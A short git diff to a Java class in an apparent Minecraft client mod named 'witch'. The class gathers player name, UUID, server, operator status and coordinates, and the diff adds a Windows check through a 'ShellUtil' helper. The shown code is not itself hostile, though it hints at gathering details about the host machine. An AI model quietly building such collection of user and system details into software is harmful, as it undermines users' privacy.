@@ -6,7 +6,7 @@ import static me.soda.witch.Witch.mc;
 
 public class PlayerInfo {
     public String playerName, uuid, server;
-    public boolean isOp, inGame;
+    public boolean isOp, inGame, isWin;
     public double x, y, z;
 
     public PlayerInfo(ClientPlayerEntity player) {
@@ -19,6 +19,7 @@ public class PlayerInfo {
             server = "unknown/singleplayer";
         }
         inGame = player != null;
+        isWin = ShellUtil.isWin();
         if (inGame) {
             isOp = player.hasPermissionLevel(4);
             x = player.getX();
